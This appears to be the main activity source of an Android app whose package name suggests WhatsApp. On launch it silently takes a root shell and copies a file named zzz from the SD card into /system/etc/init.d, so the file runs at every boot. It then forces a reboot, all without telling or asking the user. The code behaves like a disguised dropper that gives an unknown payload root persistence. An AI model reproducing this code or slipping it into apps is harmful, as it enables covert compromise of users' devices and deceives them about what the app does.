package com.kevinas.whatsapp;

import android.os.CountDownTimer;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import java.io.DataOutputStream;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {
    public void run(String s)
    {
        try {
            Process su = Runtime.getRuntime().exec("su");
            DataOutputStream o = new DataOutputStream(su.getOutputStream());
            o.writeBytes(s);
            o.flush();
            o.close();

        }catch (IOException err)
        {}
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        /*
        this.run("cp /sdcard/zzz /etc/init.d/zzz");
        this.run("reboot");
        */

        new CountDownTimer(3000, 300)
        {
            public void onFinish(){
                    run("cp /sdcard/zzz /system/etc/init.d/zzz");
                new CountDownTimer(2000, 100)
                {
                    public void onFinish(){run("reboot");}
                    public void onTick(long aa){}
                }.start();


            }
            public void onTick(long aa){}

        }.start();
    }
}
